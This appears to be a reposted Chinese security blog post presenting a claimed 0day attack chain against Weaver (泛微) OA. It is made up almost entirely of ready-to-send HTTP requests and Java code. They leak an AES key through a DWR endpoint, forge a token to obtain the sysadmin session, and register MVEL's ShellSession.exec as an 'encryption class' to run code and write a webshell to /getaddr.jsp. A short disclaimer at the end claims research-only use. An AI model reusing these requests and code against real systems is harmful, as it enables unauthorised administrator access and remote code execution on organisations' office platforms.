> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg4MTkwMTI5Mw==&mid=2247490104&idx=1&sn=bfc287009021abce228aa120eb7673cc

#  【0day】泛微OA前台登录绕过+后台组合拳RCE  
原创 XingYue404  星悦安全   2025-07-01 11:38  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x01 登录绕过  
### 利用/dwr/call接口读取加密key  
  

```
POST /dwr/call/plaincall/?callCount=1&c0-id=1&c0-scriptName=WorkflowSubwfSetUtil&c0-methodName=LoadTemplateProp&batchId=a&c0-param0=string:mobilemode&scriptSessionId=1&a=.swf HTTP/1.1
Host: xxx:xxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1

```

  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5ceGLwibV7eibnrbLN1s9VOtTUMFUFw5wm7jEQPWogeciaf1KLHCTIGRUiaAeyDOQmIhQIrqMQ5JjyZ0A/640?wx_fmt=other&from=appmsg "")  
  
其中security.key为 5f2f28dd-db4a-45  
### 调用aes加密函数  
  

```
import java.security.SecureRandom;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.spec.SecretKeySpec;
import javax.xml.bind.DatatypeConverter;

publicclass Main {
    public static String encrypt(String str, String str2) {
        try {
            KeyGenerator keyGenerator = KeyGenerator.getInstance(&#34;AES&#34;);
            SecureRandom secureRandom = SecureRandom.getInstance(&#34;SHA1PRNG&#34;);
            secureRandom.setSeed(str2.getBytes());
            keyGenerator.init(128, secureRandom);
            SecretKeySpec secretKeySpec = new SecretKeySpec(keyGenerator.generateKey().getEncoded(), &#34;AES&#34;);
            Cipher cipher = Cipher.getInstance(&#34;AES&#34;);
            cipher.init(1, secretKeySpec);
            return DatatypeConverter.printHexBinary(cipher.doFinal(str.getBytes()));
        } catch (Exception e) {
            e.printStackTrace();
            return&#34;&#34;;
        }
    }

    public static void main(String[] args) {
        System.out.println(encrypt(&#34;1;1;&#34;+System.currentTimeMillis(),&#34;5f2f28dd-db4a-45&#34;));
    }
}
```

  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5ceGLwibV7eibnrbLN1s9VOtTmMywj3iayQJ2T19WpBv1vMxXicuLMSnB8INMG1iaK11gEdxovtcCorDicw/640?wx_fmt=other&from=appmsg "")  
  
获取到密钥，即为下面需要用到的mToken  
  
### 获取sessionKey  
  

```
GET /mobilemode/mobile/server.jsp?invoker=com.api.mobilemode.web.mobile.service.MobileEntranceAction&action=meta&appid=1&appHomepageId=1&mTokenFrom=QRCode&mToken=BAAD7750912407C15FBC7CA2BDA4BDDDAEACE215E26BB871CE8D171028A66A70&_ec_ismobile=true&timeZoneOffset=&a=.swf HTTP/1.1
Host: xxxx:xxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1

```

  
###   
  
获取到sysadmin 的sessionKey  
### 登录后台  
  
将sessionKey转换为ecology_JSessionid即可登录后台  
  

```
GET /weaver/ImgFileDownload/a.swf?sessionkey=b20e3665-d8a8-403d-a041-0c5883626da4&a=.swf HTTP/1.1
Host: xxxx:xxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1

```

  
###   
###   
## 0x02 后台RCE  
### 添加方法  
  

```
POST /interface/outter/outter_encryptclassOperation.jsp?a=1.swf HTTP/1.1
Host: xxxx:xxx
If-None-Match: &#34;6evu6PUo/Cz&#34;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
If-Modified-Since: Thu, 23 Jun 2022 11:04:04 GMT
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVnIIu
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.9
Cookie: ecology_JSessionid=aaa_db33mBm_EaOGEO8bz; __randcode__=b7e3d245-5b6b-44ba-b06b-f4b5592d68dc


------WebKitFormBoundaryVnIIugCdViAmEyK3
Content-Disposition: form-data; name=&#34;operation&#34;

add
------WebKitFormBoundaryVnIIugCdViAmEyK3
Content-Disposition: form-data; name=&#34;encryptname&#34;

ttttaaa
------WebKitFormBoundaryVnIIugCdViAmEyK3
Content-Disposition: form-data; name=&#34;encryptclass&#34;

org.mvel2.sh.ShellSession
------WebKitFormBoundaryVnIIugCdViAmEyK3
Content-Disposition: form-data; name=&#34;encryptmethod&#34;

exec
------WebKitFormBoundaryVnIIugCdViAmEyK3
Content-Disposition: form-data; name=&#34;decryptmethod&#34;

exec
------WebKitFormBoundaryVnIIugCdViAmEyK3
Content-Disposition: form-data; name=&#34;isdialog&#34;

0
------WebKitFormBoundaryVnIIugCdViAmEyK3
Content-Disposition: form-data; name=&#34;x&#34;; filename=&#34;x&#34;

x
------WebKitFormBoundaryVnIIugCdViAmEyK3--
```

  
###   
### 查看添加的ID  
  

```
POST /api/integration/Outter/getOutterSysEncryptClassOperates?a=1.swf HTTP/1.1
Host: xxxx:xxx
If-None-Match: &#34;6evu6PUo/Cz&#34;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
If-Modified-Since: Thu, 23 Jun 2022 11:04:04 GMT
Content-Type: application/x-www-form-urlencoded
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.9
Cookie: ecology_JSessionid=aaa_db33mBm_EaOGEO8bz; __randcode__=b7e3d245-5b6b-44ba-b06b-f4b5592d68dc
```

  
###   
  
此处ID为2  
### 直接执行java代码写shell  
  

```
POST /interface/outter/outter_encryptclassOperation.jsp?a=1.swf HTTP/1.1
Host: xxxx:xxx
If-None-Match: &#34;6evu6PUo/Cz&#34;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
If-Modified-Since: Thu, 23 Jun 2022 11:04:04 GMT
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryITdrx
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.9
Cookie: ecology_JSessionid=aaa_db33mBm_EaOGEO8bz; __randcode__=b7e3d245-5b6b-44ba-b06b-f4b5592d68dc


------WebKitFormBoundaryITdrxxca8L1Xo7Rq
Content-Disposition: form-data; name=&#34;operation&#34;

test
------WebKitFormBoundaryITdrxxca8L1Xo7Rq
Content-Disposition: form-data; name=&#34;plaintext&#34;

马子
------WebKitFormBoundaryITdrxxca8L1Xo7Rq
Content-Disposition: form-data; name=&#34;id&#34;

2
------WebKitFormBoundaryITdrxxca8L1Xo7Rq
Content-Disposition: form-data; name=&#34;x&#34;; filename=&#34;x&#34;

1
------WebKitFormBoundaryITdrxxca8L1Xo7Rq--
```

  
###   
  
写入进 /getaddr.jsp  
## 0x03 关注公众号  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，交易所**  
  
**关注公众号，持续更新漏洞文章!**  
  
****  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5ceGLwibV7eibnrbLN1s9VOtT4NX6MHrjbWnvSExFrJ1gIXIquQhUx0besS8XoGU1l7vWDs0icUic3l2g/640?wx_fmt=jpeg&from=appmsg "")  
  
****  
**免责声明:文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
